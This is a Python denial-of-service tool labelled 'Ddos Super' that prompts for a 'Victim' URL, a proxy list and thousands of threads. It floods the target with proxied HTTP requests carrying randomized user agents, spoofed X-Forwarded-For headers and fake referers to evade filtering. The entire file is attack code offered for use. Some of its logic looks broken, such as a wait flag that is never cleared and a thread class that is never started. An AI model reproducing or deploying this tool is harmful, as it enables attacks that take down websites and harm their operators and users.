import random
import socket
import threading
import time
import datetime
import urllib.request as urllib2
import urllib.error as urllib_error
import urllib.parse as urllib_parse
import sys

# Variables
url = ''
host = ''
headers_useragents = []
headers_referers = []
keyword_top = []
request_counter = 0
flag = 0
safe = 0

def inc_counter():
    global request_counter
    request_counter += 1

def set_flag(val):
    global flag
    flag = val
    
def set_safe():
    global safe
    safe = 1

def getUserAgent():
    platform = random.choice(['Macintosh', 'Windows', 'X11'])
    if platform == 'Macintosh':
        os  = random.choice(['68K', 'PPC'])
    elif platform == 'Windows':
        os  = random.choice(['Win3.11', 'WinNT3.51', 'WinNT4.0', 'Windows NT 5.0', 'Windows NT 5.1', 'Windows NT 5.2', 'Windows NT 6.0', 'Windows NT 6.1', 'Windows NT 6.2', 'Win95', 'Win98', 'Win 9x 4.90', 'WindowsCE', 'Windows 7', 'Windows 8'])
    elif platform == 'X11':
        os  = random.choice(['Linux i686', 'Linux x86_64'])
    browser = random.choice(['chrome', 'firefox', 'ie'])
    if browser == 'chrome':
        webkit = str(random.randint(500, 599))
        version = str(random.randint(0, 28)) + '.0' + str(random.randint(0, 1500)) + '.' + str(random.randint(0, 999))
        return 'Mozilla/5.0 (' + os + ') AppleWebKit/' + webkit + '.0 (KHTML, like Gecko) Chrome/' + version + ' Safari/' + webkit
    elif browser == 'firefox':
        currentYear = datetime.date.today().year
        year = str(random.randint(2000, currentYear))
        month = random.randint(1, 12)
        month = f'0{month}' if month < 10 else str(month)
        day = random.randint(1, 30)
        day = f'0{day}' if day < 10 else str(day)
        gecko = year + month + day
        version = str(random.randint(1, 21)) + '.0'
        return 'Mozilla/5.0 (' + os + '; rv:' + version + ') Gecko/' + gecko + ' Firefox/' + version
    elif browser == 'ie':
        version = str(random.randint(1, 10)) + '.0'
        engine = str(random.randint(1, 5)) + '.0'
        token = random.choice(['.NET CLR', 'SV1', 'Tablet PC', 'Win64; IA64', 'Win64; x64', 'WOW64']) + '; ' if random.choice([True, False]) else ''
        return 'Mozilla/5.0 (compatible; MSIE ' + version + '; ' + os + '; ' + token + 'Trident/' + engine + ')'

def referer_list():
    global headers_referers
    headers_referers.extend([
        'https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=',
        'http://www.google.com/?q=',
        'https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=',
        'https://drive.google.com/viewerng/viewer?url=',
        'http://www.google.com/translate?u=',
        'https://developers.google.com/speed/pagespeed/insights/?url=',
        'http://help.baidu.com/searchResult?keywords=',
        'http://www.bing.com/search?q=',
        'https://add.my.yahoo.com/rss?url=',
        'https://play.google.com/store/search?q='
    ])
    return headers_referers

def keyword_list():
    global keyword_top
    keyword_top.extend([
        'Sex', 'Robin Williams', 'World Cup', 'Ca Si Le Roi', 'Ebola', 'Malaysia Airlines Flight 370',
        'ALS Ice Bucket Challenge', 'Flappy Bird', 'Conchita Wurst', 'ISIS', 'Frozen', '014 Sochi Winter Olympics',
        'IPhone', 'Samsung Galaxy S5', 'Nexus 6', 'Moto G', 'Samsung Note 4', 'LG G3', 'Xbox One',
        'Apple Watch', 'Nokia X', 'Ipad Air', 'Facebook', 'Anonymous'
    ])
    return keyword_top

def buildblock(size):
    return ''.join(chr(random.randint(65, 90)) for _ in range(size))

def httpcall(url):
    referer_list()
    code = 0
    param_joiner = "&" if "?" in url else "?"
    request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
    request.add_header('User-Agent', getUserAgent())
    request.add_header('Cache-Control', 'no-cache')
    request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
    request.add_header('Referer', random.choice(headers_referers) + host + buildblock(random.randint(5,10)))
    request.add_header('Keep-Alive', random.randint(110,120))
    request.add_header('Connection', 'keep-alive')
    request.add_header('Host', host)

    index = random.randint(0, len(listaproxy) - 1)
    proxy = urllib2.ProxyHandler({'http': listaproxy[index]})
    opener = urllib2.build_opener(proxy, urllib2.HTTPHandler)
    urllib2.install_opener(opener)    
    try:
        urllib2.urlopen(request)
        if flag == 1: set_flag(0)
        if code == 500: code = 0
    except urllib_error.HTTPError as e:
        set_flag(1)
        code = 500
        time.sleep(60)
    except urllib_error.URLError as e:
        sys.exit()
    else:
        inc_counter()
        urllib2.urlopen(request)
    return code

class HTTPThread(threading.Thread):
    def run(self):
        try:
            while flag < 2:
                code = httpcall(url)
                if code == 500 and safe == 1:
                    set_flag(2)
        except Exception as ex:
            pass

class MonitorThread(threading.Thread):
    def run(self):
        previous = request_counter
        while flag == 0:
            if previous + 100 < request_counter and previous != request_counter:
                previous = request_counter
            if flag == 2:
                print('')

def randomIp():
    random.seed()
    result = f'{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}.{random.randint(1, 254)}'
    return result

def randomIpList():
    random.seed()
    res = ", ".join(randomIp() for _ in range(random.randint(8, 10)))
    return res

class attacco(threading.Thread):
    def run(self):
        referer_list()
        current = x
        proxy = listaproxy[current].split(':') if current < len(listaproxy) else random.choice(listaproxy).split(':')
        useragent = "User-Agent: " + getUserAgent() + "\r\n"
        forward = "X-Forwarded-For: " + randomIpList() + "\r\n"
        referer = "Referer: "+ random.choice(headers_referers) + url + "?r="+ str(random.randint(1, 1500)) +  "\r\n"
        httprequest = get_host + useragent + referer + accept + forward + connection + "\r\n"

        while nload:
            time.sleep(1)
        
        while True:
            try:
                a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                a.connect((proxy[0], int(proxy[1])))
                a.send(httprequest.encode())
                try:
                    for _ in range(4):
                        a.send(httprequest.encode())
                except:
                    tts = 1
            except:
                proxy = random.choice(listaproxy).split(':')

# Main
print('\n\t..:: > Edit Code By Phan < ::..')
print('\t  ==> #~~  Ddos Super ~~# <==  ')
url = input("Victim: ")
host_url = url.replace("http://", "").replace("https://", "").split('/')[0]
in_file = open(input("File proxy: "), "r")
proxyf = in_file.read()
in_file.close()
listaproxy = proxyf.split('\n')
thread = int(input("So luong (3000): "))
get_host = "GET " + url + " HTTP/1.1\r\nHost: " + host_url + "\r\n"
accept = "Accept-Encoding: gzip, deflate\r\n"
connection = "Connection: Keep-Alive, Persist\r\nProxy-Connection: keep-alive\r\n"
nload = 1
for x in range(thread):
    try:
        attacco().start()
    except:
        pass
    time.sleep(0.1)
    
while True:
    try:
        MonitorThread().start()
    except:
        pass
    time.sleep(5)
